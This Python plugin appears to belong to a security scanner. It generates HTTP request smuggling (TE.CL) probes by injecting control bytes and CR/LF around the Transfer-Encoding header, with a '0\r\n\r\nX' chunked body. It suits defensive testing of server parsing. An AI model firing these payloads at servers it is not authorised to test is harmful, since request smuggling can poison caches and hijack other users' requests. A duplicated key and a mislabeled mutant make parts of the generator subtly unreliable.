from pprint import pprint
from urllib.parse import ParseResult, urlparse


from core.types.httpRequestPrototype import HttpRequestPrototype


class HttpTeClPlugin:

    def __init__(self, endpoint : str = "", gadget_dict: dict = None, verbose: bool = False) -> None:
        self.url = endpoint
        self.host, self.port, self.netloc, self.uri = self.urlParser(endpoint)
        self.gadget_dict: dict[str, str] = gadget_dict
        self.mutants_list: dict[str, HttpRequestPrototype] = {}
        self.verbose = verbose

    def generate(self) -> None:
        # Random shocking characters insertion
        self.__pointMutation()
        self.__doublePointMutation()
        self.__xInsertionPointMutation()
        
        return self.mutants_list

    def httpTemplate(self, tecl_name: str, tecl_value: str, http_body: str = "0\r\n\r\nX") -> HttpRequestPrototype:

        mutant = HttpRequestPrototype(self.gadget_dict)
        mutant.addHeader("Host", self.host)
        mutant.addHeader("Connection", "Close")
        mutant.addHeader(
            "User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
        mutant.addHeader(
            "Content-type", "application/x-www-form-urlencoded; charset=UTF-8")
        mutant.addHeader(tecl_name, tecl_value)
        mutant.body = http_body
        return mutant

    def __pointMutation(self):
        # Random shocking characters insertion
        for shockers in range(0x1, 0xFF):

            # single mutations
            self.mutants_list["point-key-start-%02x" % shockers] = self.httpTemplate(
                "%cTransfer-Encoding" % shockers, "chunked")

            self.mutants_list["point-key-end-%02x" % shockers] = self.httpTemplate(
                "Transfer-Encoding%c" % shockers, "chunked")

            self.mutants_list["point-value-start-%02x" % shockers] = self.httpTemplate(
                "Transfer-Encoding", "%cchunked" % shockers)

            self.mutants_list["point-value-end-%02x" % shockers] = self.httpTemplate(
                "Transfer-Encoding", "chunked%c" % shockers)

    def __doublePointMutation(self):

        for shockers in range(0x1, 0xFF):
            self.mutants_list["double-start-start-%02x" % shockers] = self.httpTemplate(
                "%cTransfer-Encoding" % shockers, "%cchunked" % shockers)
            self.mutants_list["double-end-end-%02x" % shockers] = self.httpTemplate(
                "Transfer-Encoding%c" % shockers, "chunked%c" % shockers
            )
            self.mutants_list["double-start-end-%02x" % shockers] = self.httpTemplate(
                "%cTransfer-Encoding" % shockers, "chunked%c" % shockers)
            self.mutants_list["double-end-start-%02x" % shockers] = self.httpTemplate(
                "%cTransfer-Encoding" % shockers, "%cchunked" % shockers
            )

    def __xInsertionPointMutation(self):
        
        # X header insertion
        for shockers in range(0x1, 0xFF):
            self.mutants_list["X-preheaders-end-%c" % shockers] = self.httpTemplate(
                "X: X%cTransfer-Encoding"%shockers,"chunked"
            )
            self.mutants_list["X-preheaders-start-%c-end-%c" %(shockers,shockers)] = self.httpTemplate(
                "X:%cX%cTransfer-Encoding"%(shockers,shockers),"chunked"
            )
            self.mutants_list["X-preheaders-after-colon-with-%c" % shockers] = self.httpTemplate(
                "X:%cTransfer-Encoding"%shockers,"chunked"
            )
            self.mutants_list["X-preheaders-end-cr-%c" % shockers] = self.httpTemplate(
                "X: X\r%cTransfer-Encoding"%shockers,"chunked"
            )
            self.mutants_list["X-preheaders-end-lf-%c" % shockers] = self.httpTemplate(
                "X: X\n%cTransfer-Encoding"%shockers,"chunked"
            )
            self.mutants_list["X-preheaders-%c-end-lf" % shockers] = self.httpTemplate(
                "X: X%c\nTransfer-Encoding"%shockers,"chunked"
            )
            self.mutants_list["X-preheaders-%c-end-lf" % shockers] = self.httpTemplate(
                "X: X%c\rTransfer-Encoding"%shockers,"chunked"
            )

    def urlParser(self, url):

        parser_obj: ParseResult = urlparse(url)
        netloc = parser_obj.netloc
        scheme = parser_obj.scheme
        uri = '/'.join(url.split('/')[3:])

        if ':' not in netloc:
            if scheme == "https":
                port = 443
                host = netloc
            else:
                port = 80
                host = netloc
        else:
            host, port = netloc.split(':')

        return host, port, netloc, uri

    def generateRequestToFile(self , filename : str):
        with open(filename , "w") as f:
            for key , value in self.mutants_list.items():
                obj = f"\n\n------------{key}-------------------\n{value}"
                f.write(obj)

